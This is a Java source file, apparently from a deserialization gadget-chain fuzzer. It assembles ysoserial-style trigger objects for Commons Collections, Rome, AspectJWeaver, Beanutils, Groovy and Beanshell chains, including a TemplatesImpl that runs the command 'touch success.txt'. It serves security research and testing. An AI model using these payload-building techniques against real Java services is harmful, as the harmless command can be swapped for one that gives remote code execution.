package com.example;

import com.code_intelligence.jazzer.autofuzz.*;

// commons_collections_5, vaadin
import javax.management.BadAttributeValueExpException;
// aspectjweaver
import java.util.HashMap;
import java.util.HashSet;
//Rome
import java.lang.reflect.Constructor;
import java.lang.reflect.Array;
// Groovy
import java.lang.reflect.InvocationHandler;
import java.util.Map;
import java.lang.reflect.Proxy;

// Beanutils, CC4
import java.math.BigInteger;
import java.util.PriorityQueue;
import java.util.Comparator;
import java.util.List;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import org.jgrapht.*;
import org.jgrapht.graph.*;
import org.jgrapht.traverse.*;
import org.jgrapht.alg.shortestpath.*;


import analysis.GadgetVertexSerializable;

import org.apache.log4j.Logger;
import java.lang.reflect.Field;
import java.util.concurrent.ThreadLocalRandom;

// Based on the library being targeted, we decide on how to place the payload
// inside the trigger gadget. The final placement requires special care in the form
// of reflection-based manipulation of class variables since we might trigger the serialized
// payload if we were to try to instantiate the trigger gadget with conventional methods
class SetupPayload {

    private static final Logger LOGGER = Logger.getLogger(SetupPayload.class);
    // We decide how to handle the trigger gadget based on the target library that
    // is being fuzzed
    public static Object prepareTrigger(String entryGadgetName, Object payload, GraphPath<GadgetVertexSerializable, DefaultEdge> path) throws Exception {  
        // if (SeriFuzz.targetLibrary.equals("commons_collections_5") || 
        //     SeriFuzz.targetLibrary.equals("commons_collections_itw") ||
        //     SeriFuzz.targetLibrary.equals("vaadin1")) {
        if (entryGadgetName.contains("toString()")) { //cc_3.1, vaadin

            BadAttributeValueExpException val = new BadAttributeValueExpException(null);
            try {
                Field valfield = val.getClass().getDeclaredField("val");
                valfield.setAccessible(true);
                valfield.set(val, payload);
            } catch (NoSuchFieldException | IllegalAccessException e) {
                e.printStackTrace();
                System.exit(1);
            }
            return (Object) val;
        } else if (entryGadgetName.contains("hashCode()")) { 
	        int choice = ThreadLocalRandom.current().nextInt(0, 2); 
            if (choice == 0) { // Aspectjweaver
                HashSet map = new HashSet(1);
                map.add("foo");
                Field f = null;
                try {
                    f = HashSet.class.getDeclaredField("map");
                } catch (NoSuchFieldException e) {
                    f = HashSet.class.getDeclaredField("backingMap");
                } 

                f.setAccessible(true);
                HashMap innimpl = (HashMap) f.get(map);

                Field f2 = null;
                try {
                    f2 = HashMap.class.getDeclaredField("table");
                } catch (NoSuchFieldException e) {
                    f2 = HashMap.class.getDeclaredField("elementData");
                }

                f2.setAccessible(true);
                Object[] array = (Object[]) f2.get(innimpl);

                Object node = array[0];
                if(node == null){
                    node = array[1];
                }

                Field keyField = null;
                try {
                    keyField = node.getClass().getDeclaredField("key");
                } catch(Exception e){
                    keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
                }

                keyField.setAccessible(true);
                keyField.set(node, payload);
                return (Object) map;
            } else { // Rome
			    HashMap map = new HashMap();
                Field f3 = HashMap.class.getDeclaredField("size");
                f3.setAccessible(true);
                f3.set(map, 2);

                Class nodeC;
                try {
                    nodeC = Class.forName("java.util.HashMap$Node");
                }
                catch ( ClassNotFoundException e ) {
                    nodeC = Class.forName("java.util.HashMap$Entry");
                }
                Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
                nodeCons.setAccessible(true);

                Object tbl = Array.newInstance(nodeC, 2);
                Array.set(tbl, 0, nodeCons.newInstance(0, payload, payload, null));
                Array.set(tbl, 1, nodeCons.newInstance(0, payload, payload, null));

                // Reflections.setFieldValue(s, "table", tbl);
                Field f4 = HashMap.class.getDeclaredField("table");
                f4.setAccessible(true);
                f4.set(map, tbl);
                return (Object) map;
              }

       } else if (entryGadgetName.contains("compare")) {

		    // create queue with numbers and basic comparator
		    // final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, (Comparator)payload);
		    final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, (Comparator)payload);
		    // stub data for replacement later
		    queue.add(new BigInteger("1"));
		    queue.add(new BigInteger("1"));

            // XXX: This switching object strategy may not be necessary to
            // concretize the path but only be necessary for the full exploit
            // to be realized which we keep out of scope for Crystallizer
            // anyway. One thing to consider would be to see how far we can get
            // without these hardcoded assumptions and see if we can concretize
            // the chains. Maybe one way to see what is needed is to create an
            // exploit and spin off a separate mode for it
            //
            // A concrete example of the above phenomenon was seen when
            // validating the ground truth chain in Click1 where we see that we
            // did not really need to do the set the `name` inside Column
            // object to outputProperties. Even with that being incorrectly
            // set, it is still sufficient to reach the end of the property
            // manipulation part 
            //
            // Get a random object that is part of the instantiated gadget
            // chain and try to switch objects through reflection which is either 
			// called through comparator or through propertyUtils
            List<GadgetVertexSerializable> vertexList = path.getVertexList();
            int idx = ThreadLocalRandom.current().nextInt(0, vertexList.size()); 
            GadgetVertexSerializable vertex = vertexList.get(idx);
            Class<?> key = ObjectFactory.getClass(vertex.getClsName());
            Object node = (Meta.localCache.get(key));
            
			// Get a random field which is a string type. We need this because
			// we use this to switch with the attack string that would let us perform
            // an attack	
			Field chosenField = getRandomStringField(node);
			if (chosenField == null) { 
				throw new Exception("No fields from the chosen node were of string type");
			}
			
			// Choose the string which defines which object will be called
            String switchString = null;
            int choice = ThreadLocalRandom.current().nextInt(0, 2); 
			if (choice == 0) {
                switchString = "outputProperties";
			} else {
                switchString = "newTransformer";
            }
            LOGGER.debug("Flipping field:" + chosenField.getName());
            setFieldValue(node, chosenField.getName(), switchString);
			// int choice = 2;
            // if (choice == 0) { // Beanutils
		    //     setFieldValue(node, "property", "outputProperties");
            // } else if (choice == 1) { // CC4
		    //     setFieldValue(node, "iMethodName", "newTransformer");
            // } else {
		    //     setFieldValue(node, "name", "outputProperties");
			// }

		    // switch contents of queue
		    final Object[] queueArray = (Object[]) getFieldValue(queue, "queue");
            Object templates =  Meta.createTemplatesImpl("touch success.txt", TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
		    queueArray[0] = templates;
		    queueArray[1] = templates;
            return (Object) queue;
      } else if (entryGadgetName.contains("invoke")) {
            int choice = ThreadLocalRandom.current().nextInt(0, 2); 
            choice = 1;
            if (choice == 0) { // Groovy
                // Create the dynamic proxy
                Map map = (Map) Proxy.newProxyInstance(SetupPayload.class.getClassLoader(), new Class[] {Map.class},(InvocationHandler) payload);
                // Wrap into the annotated invocation handler
		        final Constructor<?> ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
                ctor.setAccessible(true);
                return (Object) ctor.newInstance(Override.class, map);
            } else { // Beanshell
	            Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, (InvocationHandler) payload);

	            // Prepare Trigger Gadget (will call Comparator.compare() during deserialization)
	            final PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
	            Object[] queue = new Object[] {1,1};
	            setFieldValue(priorityQueue, "queue", queue);
	            setFieldValue(priorityQueue, "size", 2);
                return (Object) priorityQueue;
            }
      } //  else if (entryGadgetName.contains("get")) {
      //        // Wrap into the annotated invocation handler
	  //        final Constructor<?> ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
      //        ctor.setAccessible(true);
      //        InvocationHandler ih = ctor.newInstance(Override.class, (Map) payload);

      //        // Create the dynamic proxy
      //        Map map = (Map) Proxy.newProxyInstance(SetupPayload.class.getClassLoader(), new Class[] {Map.class},(InvocationHandler) payload);
      //        return (Object) ctor.newInstance(Override.class, map);
      //  }
      else {
            LOGGER.info("Unknown entry gadget identified. Known entry gadgets:[toString(), hashCode()]");
            System.exit(1);
      }
        return null;
    }

    // Convenience function ripped from ysoserial
    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
    try {
        field = clazz.getDeclaredField(fieldName);
        field.setAccessible(true);
        }
        catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
    	return field;
    }
    
    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
    	final Field field = getField(obj.getClass(), fieldName);
    	field.set(obj, value);
    }

	public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
		final Field field = getField(obj.getClass(), fieldName);
		return field.get(obj);
	}

	// Convenience function to return a list of String fields in a class
	public static Field getRandomStringField(Object node) {
			Field[] fields = node.getClass().getDeclaredFields();
            Field[] stringFields = new Field[fields.length];
            int stringIdx = 0; // Index to keep track of string indices
			// Iterate through the field to collect string fields
			for (int i = 0 ; i < fields.length; i++) { 
                if (fields[i].getType().getName().equals("java.lang.String")) {
                    LOGGER.debug("Found string field");
                    stringFields[stringIdx] = fields[i];
                    stringIdx += 1;
                }	
			}
            Field chosenField = null;
            if (stringIdx > 0) { // Atleast one string field exists
			    int idx = ThreadLocalRandom.current().nextInt(0, stringIdx + 1);
			    chosenField = stringFields[idx];
            }
            return chosenField;
	}

}

